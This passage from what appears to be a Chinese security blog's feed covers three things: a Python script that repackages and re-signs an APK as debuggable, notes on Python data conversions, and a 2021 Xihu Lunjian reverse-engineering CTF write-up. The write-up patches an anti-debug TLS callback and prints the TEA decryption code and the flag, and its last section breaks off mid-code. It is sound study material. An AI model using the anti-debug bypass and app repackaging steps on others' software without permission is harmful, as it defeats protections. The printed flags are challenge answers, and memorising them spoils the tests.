class="string">&quot;utf-8&quot;</span>)<span class="keyword">as</span> f:</span><br><span class="line">        f.write(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[X] 格式有错! python后跟apk名字&quot;</span>)</span><br><span class="line">        sys.exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    apkpath = sys.argv[<span class="number">1</span>]</span><br><span class="line">    apkname = os.path.splitext(apkpath)[<span class="number">0</span>]</span><br><span class="line">    apkdirpath = apkname + <span class="string">&quot;_DIR&quot;</span></span><br><span class="line">    <span class="comment"># 1、解包APK</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 解包APK文件&quot;</span>)</span><br><span class="line">    subprocess.run([<span class="string">&#x27;apktool.bat&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, apkpath, <span class="string">&quot;-o&quot;</span>, apkdirpath])</span><br><span class="line">    os.chdir(apkdirpath)</span><br><span class="line">    <span class="comment"># 2、打开xml文件</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 当前工作路径为: &quot;</span> + os.getcwd())</span><br><span class="line">    handle_xml()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 修改XML文件成功&quot;</span>)</span><br><span class="line">    <span class="comment"># 6、重新打包为APK</span></span><br><span class="line">    os.chdir(<span class="string">&#x27;../&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 重新打包APK文件&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 当前工作路径为: &quot;</span> + os.getcwd())</span><br><span class="line">    apkpath_new = apkname + <span class="string">&quot;_new.apk&quot;</span></span><br><span class="line">    subprocess.run([<span class="string">&#x27;apktool.bat&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, apkdirpath, <span class="string">&quot;-o&quot;</span>, apkpath_new])</span><br><span class="line">    <span class="comment"># 7、生成签名文件</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 密码请输入123456，否则会出错&quot;</span>)</span><br><span class="line">    <span class="comment"># keytool -genkey -keystore 签名文件的文件名 -keyalg RSA -validity 10000 -alias 签名文件别名</span></span><br><span class="line">    subprocess.run([<span class="string">&#x27;keytool&#x27;</span>, <span class="string">&#x27;-genkey&#x27;</span>, <span class="string">&#x27;-keystore&#x27;</span>, apkname + <span class="string">&quot;_new.keystore&quot;</span>,</span><br><span class="line">                   <span class="string">&#x27;-keyalg&#x27;</span>, <span class="string">&#x27;RSA&#x27;</span>, <span class="string">&#x27;-validity&#x27;</span>, <span class="string">&#x27;10000&#x27;</span>, <span class="string">&#x27;-alias&#x27;</span>, apkname])</span><br><span class="line">    <span class="comment"># 8、给APK文件添加签名</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 给<span class="subst">&#123;apkname&#125;</span>_new.apk添加签名&quot;</span>)</span><br><span class="line">    subprocess.run([<span class="string">&#x27;jarsigner.exe&#x27;</span>, <span class="string">&#x27;-verbose&#x27;</span>, <span class="string">&#x27;-keystore&#x27;</span>, apkname + <span class="string">&quot;_new.keystore&quot;</span>, <span class="string">&#x27;-storepass&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;-signedjar&#x27;</span>,</span><br><span class="line">                   apkname + <span class="string">&#x27;_new_sign.apk&#x27;</span>, <span class="string">&#x27;-digestalg&#x27;</span>, <span class="string">&#x27;SHA1&#x27;</span>, <span class="string">&#x27;-sigalg&#x27;</span>, <span class="string">&#x27;MD5withRSA&#x27;</span>, apkname + <span class="string">&quot;_new.apk&quot;</span>, apkname])</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>如果是JEB调试，必须设置<code>android:debuggable=&quot;true&quot;</code></li><li>如果不用JEB，仅仅是IDA调试so文件，不用必须设置<code>android:debuggable=&quot;true&quot;</code>, 但是必须得设置<code>android:extractNativeLibs=&quot;true&quot;</code></li></ol><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ol><li><p><a href="https://www.jianshu.com/p/eb766d2bb837">https://www.jianshu.com/p/eb766d2bb837</a></p></li><li><p><a href="https://www.jianshu.com/p/879d53256ff3">https://www.jianshu.com/p/879d53256ff3</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 安卓 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> debug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 常用数据类型转换</title>
      <link href="/2021/12/03/python%E5%A4%84%E7%90%86%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>/2021/12/03/python%E5%A4%84%E7%90%86%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Python-常用数据类型转换"><a href="#Python-常用数据类型转换" class="headerlink" title="Python 常用数据类型转换"></a>Python 常用数据类型转换</h1><p>在CTF中，经常需要各种数据类型之间的转换</p><h2 id="struct模块"><a href="#struct模块" class="headerlink" title="struct模块"></a>struct模块</h2><blockquote><p>官方文档: <a href="https://docs.python.org/zh-cn/3.10/library/struct.html">https://docs.python.org/zh-cn/3.10/library/struct.html</a></p></blockquote><p>C语言数据结构与python bytes之间的转换</p><p>​                                                                                 </p><p><img src="./image-20211203171927404.png" alt="image-20211203171927404"></p><p><img src="./image-20211203171903200.png" alt="image-20211203171903200"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> struct                                                                       </span><br><span class="line">                                                                                            </span><br><span class="line">In [<span class="number">2</span>]: struct.pack(<span class="string">&quot;&lt;LLLL&quot;</span>, <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)                                                       </span><br><span class="line">Out[<span class="number">2</span>]: <span class="string">b&#x27;\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00&#x27;</span>                 </span><br><span class="line">                                                                                            </span><br><span class="line">In [<span class="number">3</span>]: struct.pack(<span class="string">&quot;&lt;LLLL&quot;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)                                                      </span><br><span class="line">---------------------------------------------------------------------------                 </span><br><span class="line">error                                     Traceback (most recent call last)                 </span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">3</span>-e0808e208379&gt; <span class="keyword">in</span> &lt;module&gt;                                                  </span><br><span class="line">----&gt; <span class="number">1</span> struct.pack(<span class="string">&quot;&lt;LLLL&quot;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)                                                      </span><br><span class="line">                                                                                            </span><br><span class="line">error: required argument <span class="keyword">is</span> <span class="keyword">not</span> an integer                                                  </span><br><span class="line">                                                                                            </span><br><span class="line">In [<span class="number">4</span>]: c = struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))                                                     </span><br><span class="line">                                                                                            </span><br><span class="line">In [<span class="number">5</span>]: b = struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, c)                                                          </span><br><span class="line">                                                                                            </span><br><span class="line">In [<span class="number">6</span>]: b[<span class="number">0</span>]                                                                                </span><br><span class="line">Out[<span class="number">6</span>]: <span class="number">97</span>                                                                                  </span><br></pre></td></tr></table></figure><h2 id="binascii模块"><a href="#binascii模块" class="headerlink" title="binascii模块"></a>binascii模块</h2><p>二进制和ASCII之间的转换</p><blockquote><p>官方文档: <a href="https://docs.python.org/zh-cn/3.7/library/binascii.html">https://docs.python.org/zh-cn/3.7/library/binascii.html</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: binascii.hexlify(<span class="string">b&#x27;12345&#x27;</span>)</span><br><span class="line">Out[<span class="number">2</span>]: <span class="string">b&#x27;3132333435&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: binascii.hexlify(<span class="string">b&#x27;12345&#x27;</span>, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">Out[<span class="number">3</span>]: <span class="string">b&#x27;31-32-33-34-35&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: binascii.unhexlify(<span class="string">b&#x27;3132333435&#x27;</span>)</span><br><span class="line">Out[<span class="number">4</span>]: <span class="string">b&#x27;12345&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: binascii.crc32(<span class="string">b&#x27;123&#x27;</span>)</span><br><span class="line">Out[<span class="number">5</span>]: <span class="number">2286445522</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: <span class="built_in">hex</span>(binascii.crc32(<span class="string">b&#x27;123&#x27;</span>))</span><br><span class="line">Out[<span class="number">6</span>]: <span class="string">&#x27;0x884863d2&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="进制之间的转换"><a href="#进制之间的转换" class="headerlink" title="进制之间的转换"></a>进制之间的转换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">7</span>]: <span class="built_in">int</span>(<span class="number">0x12</span>)</span><br><span class="line">Out[<span class="number">7</span>]: <span class="number">18</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: <span class="built_in">int</span>(<span class="string">&#x27;23&#x27;</span>)</span><br><span class="line">Out[<span class="number">8</span>]: <span class="number">23</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: <span class="built_in">int</span>(<span class="string">&#x27;1111&#x27;</span>, <span class="number">2</span>)</span><br><span class="line">Out[<span class="number">9</span>]: <span class="number">15</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">10</span>]: <span class="built_in">int</span>(<span class="string">&#x27;11&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">Out[<span class="number">10</span>]: <span class="number">17</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: <span class="built_in">bin</span>(<span class="number">123</span>)</span><br><span class="line">Out[<span class="number">11</span>]: <span class="string">&#x27;0b1111011&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">12</span>]: <span class="built_in">int</span>(<span class="string">&#x27;1111011&#x27;</span>, <span class="number">2</span>)</span><br><span class="line">Out[<span class="number">12</span>]: <span class="number">123</span></span><br></pre></td></tr></table></figure><h2 id="bytes和数字之间的转换"><a href="#bytes和数字之间的转换" class="headerlink" title="bytes和数字之间的转换"></a>bytes和数字之间的转换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">17</span>]: <span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"></span><br><span class="line">In [<span class="number">18</span>]: bytes_to_long(<span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line">Out[<span class="number">18</span>]: <span class="number">1718378855</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">19</span>]: <span class="built_in">hex</span>(<span class="number">1718378855</span>)</span><br><span class="line">Out[<span class="number">19</span>]: <span class="string">&#x27;0x666c6167&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">20</span>]: <span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">In [<span class="number">21</span>]: unhexlify(<span class="number">1718378855</span>)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">TypeError                                 Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">21</span>-43c0727e7de8&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> unhexlify(<span class="number">1718378855</span>)</span><br><span class="line"></span><br><span class="line">TypeError: argument should be <span class="built_in">bytes</span>, buffer <span class="keyword">or</span> ASCII string, <span class="keyword">not</span> <span class="string">&#x27;int&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">22</span>]: unhexlify(<span class="string">&#x27;666c6167&#x27;</span>)</span><br><span class="line">Out[<span class="number">22</span>]: <span class="string">b&#x27;flag&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">23</span>]: long_to_bytes(<span class="number">1718378855</span>)</span><br><span class="line">Out[<span class="number">23</span>]: <span class="string">b&#x27;flag&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="列表和bytes-str类型转换"><a href="#列表和bytes-str类型转换" class="headerlink" title="列表和bytes,str类型转换"></a>列表和bytes,str类型转换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">28</span>]: a = <span class="string">b&#x27;flag&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">29</span>]: b = <span class="built_in">list</span>(a)</span><br><span class="line"></span><br><span class="line">In [<span class="number">30</span>]: b</span><br><span class="line">Out[<span class="number">30</span>]: [<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">31</span>]: <span class="built_in">bytes</span>(b)</span><br><span class="line">Out[<span class="number">31</span>]: <span class="string">b&#x27;flag&#x27;</span></span><br><span class="line">    </span><br><span class="line">In [<span class="number">36</span>]: a = <span class="built_in">list</span>(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">In [<span class="number">37</span>]: a</span><br><span class="line">Out[<span class="number">37</span>]: [<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">38</span>]: <span class="string">&quot;&quot;</span>.join(a)</span><br><span class="line">Out[<span class="number">38</span>]: <span class="string">&#x27;flag&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> struct </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021西湖论剑_RE_WP</title>
      <link href="/2021/12/02/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91_RE_WP/"/>
      <url>/2021/12/02/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91_RE_WP/</url>
      
        <content type="html"><![CDATA[<h1 id="2021西湖论剑-RE-WP"><a href="#2021西湖论剑-RE-WP" class="headerlink" title="2021西湖论剑_RE_WP"></a>2021西湖论剑_RE_WP</h1><h2 id="TacticalArmed"><a href="#TacticalArmed" class="headerlink" title="TacticalArmed"></a>TacticalArmed</h2><p>IDA打开发现有TLS回调函数，如果没有调试就初始化4个值</p><p><img src="./image-20211202195512988.png" alt="image-20211202195512988"></p><p>直接patch，强制jmp到4010F1的位置</p><p><img src="./image-20211202195849333.png" alt="image-20211202195849333"></p><p>第50行，v21那里是每次执行的指令</p><p><img src="./image-20211202200048223.png" alt="image-20211202200048223"></p><p>写OD脚本，在004014A3和 40146D位置下断点，OD运行脚本，打印出下图中一轮来</p><p><img src="./image-20211202201140735.png" alt="image-20211202201140735"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var f</span><br><span class="line">var x</span><br><span class="line">mov f,&quot;C:\\Users\\ZSKY\\Desktop\\xihulunjian\\log.txt&quot;</span><br><span class="line">vv:</span><br><span class="line">RUN</span><br><span class="line">cmp eip,004014A3</span><br><span class="line">je stop</span><br><span class="line">cmp eip,40146D</span><br><span class="line">jnz vv</span><br><span class="line">sti</span><br><span class="line">opcode eip</span><br><span class="line">eval &quot;&#123;eip&#125;  :   &#123;$RESULT_1&#125;&quot;</span><br><span class="line">wrta f,$RESULT</span><br><span class="line">jmp vv</span><br><span class="line">stop:</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">5AC720  :   mov ecx,dword ptr ds:[0x405748]</span><br><span class="line">5AC720  :   sub ecx,0x7E5A96D2</span><br><span class="line">5AC720  :   mov dword ptr ds:[0x405748],ecx</span><br><span class="line">5AC720  :   mov edx,dword ptr ds:[0x40564C]</span><br><span class="line">5AC720  :   shr edx,0x5</span><br><span class="line">5AC720  :   mov eax,dword ptr ds:[0x405004]</span><br><span class="line">5AC720  :   add eax,edx</span><br><span class="line">5AC720  :   mov ecx,dword ptr ds:[0x405748]</span><br><span class="line">5AC720  :   add ecx,dword ptr ds:[0x40564C]</span><br><span class="line">5AC720  :   xor eax,ecx</span><br><span class="line">5AC720  :   mov edx,dword ptr ds:[0x40564C]</span><br><span class="line">5AC720  :   shl edx,0x4</span><br><span class="line">5AC720  :   mov ecx,dword ptr ds:[0x405000]</span><br><span class="line">5AC720  :   add ecx,edx</span><br><span class="line">5AC720  :   xor eax,ecx</span><br><span class="line">5AC720  :   mov edx,dword ptr ds:[0x405648]</span><br><span class="line">5AC720  :   add edx,eax</span><br><span class="line">5AC720  :   mov dword ptr ds:[0x405648],edx</span><br><span class="line">5AC720  :   mov eax,dword ptr ds:[0x405648]</span><br><span class="line">5AC720  :   shr eax,0x5</span><br><span class="line">5AC720  :   mov ecx,dword ptr ds:[0x40500C]</span><br><span class="line">5AC720  :   add ecx,eax</span><br><span class="line">5AC720  :   mov edx,dword ptr ds:[0x405748]</span><br><span class="line">5AC720  :   add edx,dword ptr ds:[0x405648]</span><br><span class="line">5AC720  :   xor ecx,edx</span><br><span class="line">5AC720  :   mov eax,dword ptr ds:[0x405648]</span><br><span class="line">5AC720  :   shl eax,0x4</span><br><span class="line">5AC720  :   mov edx,dword ptr ds:[0x405008]</span><br><span class="line">5AC720  :   add edx,eax</span><br><span class="line">5AC720  :   xor ecx,edx</span><br><span class="line">5AC720  :   mov eax,dword ptr ds:[0x40564C]</span><br><span class="line">5AC720  :   add eax,ecx</span><br><span class="line">5AC720  :   mov dword ptr ds:[0x40564C],eax</span><br></pre></td></tr></table></figure><p>在IDA中随便找个地方patch下上面汇编，然后F5</p><p><img src="./image-20211202202148594.png" alt="image-20211202202148594"></p><p>稍微整理整理</p><p><img src="./image-20211202202351975.png" alt="image-20211202202351975"></p><p>这不就是tea结构吗，只不过delta换了，然后循环变为了33轮,提取出数据写脚本即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc_flag[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0xED</span>, <span class="number">0x1D</span>, <span class="number">0x2F</span>, <span class="number">0x42</span>, <span class="number">0x72</span>, <span class="number">0xE4</span>, <span class="number">0x85</span>, <span class="number">0x14</span>, <span class="number">0xD5</span>, <span class="number">0x78</span>,</span><br><span class="line">        <span class="number">0x55</span>, <span class="number">0x03</span>, <span class="number">0xA2</span>, <span class="number">0x80</span>, <span class="number">0x6B</span>, <span class="number">0xBF</span>, <span class="number">0x45</span>, <span class="number">0x72</span>, <span class="number">0xD7</span>, <span class="number">0x97</span>,</span><br><span class="line">        <span class="number">0xD1</span>, <span class="number">0x75</span>, <span class="number">0xAE</span>, <span class="number">0x2D</span>, <span class="number">0x63</span>, <span class="number">0xA9</span>, <span class="number">0x5F</span>, <span class="number">0x66</span>, <span class="number">0x74</span>, <span class="number">0x6D</span>,</span><br><span class="line">        <span class="number">0x2E</span>, <span class="number">0x29</span>, <span class="number">0xC1</span>, <span class="number">0xFC</span>, <span class="number">0x95</span>, <span class="number">0x97</span>, <span class="number">0xE9</span>, <span class="number">0xC8</span>, <span class="number">0xB5</span>, <span class="number">0x0B</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> key[] = &#123;</span><br><span class="line">    <span class="number">0x7CE45630</span>, <span class="number">0x58334908</span>, <span class="number">0x66398867</span>, <span class="number">0x0C35195B1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">uint32_t</span> *v, <span class="keyword">uint32_t</span> *k, <span class="keyword">uint32_t</span> *pSum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], i;</span><br><span class="line">    <span class="keyword">uint32_t</span> delta = <span class="number">0x7E5A96D2</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + *pSum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + *pSum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">        *pSum += delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span> * <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum -= <span class="number">0x7E5A96D2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> *pFlag = (<span class="keyword">uint32_t</span> *)enc_flag;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">decrypt</span>(pFlag + (<span class="number">4</span> - i) * <span class="number">2</span>, key, &amp;sum);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, pFlag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"># kgD1ogB2yGa2roiAeXiG8_aqnLzCJ_rFHSPrn55K</span><br></pre></td></tr></table></figure><p><img src="./image-20211202202945203.png" alt="image-20211202202945203"></p><p>flag为 <code>kgD1ogB2yGa2roiAeXiG8_aqnLzCJ_rFHSPrn55K</code></p><h2 id="gghdl"><a href="#gghdl" class="headerlink" title="gghdl"></a>gghdl</h2><p>IDA打开程序</p><p><img src="./image-20211202153244872.png" alt="image-20211202153244872"></p><p>直接F5分析一波</p><p><img src="./image-20211202153710221.png" alt="image-20211202153710221"></p><p>case 0是输入flag，case 5是验证flag是否正确，case 6是对flag中的每个字符进行加密，case 7是将加密后的每个字符后的数据与程序中生成的数据比较</p><p>调试起来</p><p><img src="./image-20211202154017609.png" alt="image-20211202154017609"></p><p><img src="./image-20211202153957037.png" alt="image-20211202153957037"></p><p>加密后v127指向的值为  2, 3, 2, 2, 2, 2, 2, 3 ， 而ord(‘A’) = 0x41, 二进制为 01000001</p><p>也就是把2换为0， 把3换为1</p><p>然后运行来到case 7的位置</p><p><img src="./image-20211202154257797.png" alt="image-20211202154257797"></p><p>v126的值为3, 3, 2, 3, 3, 3, 2, 3 转为二进制 0b11011101</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;<span class="number">0b11011101</span></span><br><span class="line"><span class="number">0xdd</span></span><br><span class="line">Python&gt;<span class="number">0xdd</span> ^ <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"><span class="number">0x9c</span></span><br></pre></td></tr></table></figure><p>然后下面的同理，发现全都是xor 0x9c, 一步步调试将对比的数据v123提取出来，然后3变为1，2变为0，转为2进制，再xor 0x9c即为flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0b11011000</span>, <span class="number">0b11011101</span>, <span class="number">0b11001111</span>, <span class="number">0b11011111</span>, <span class="number">0b11001000</span>, <span class="number">0b11011010</span>, <span class="number">0b11100111</span>, <span 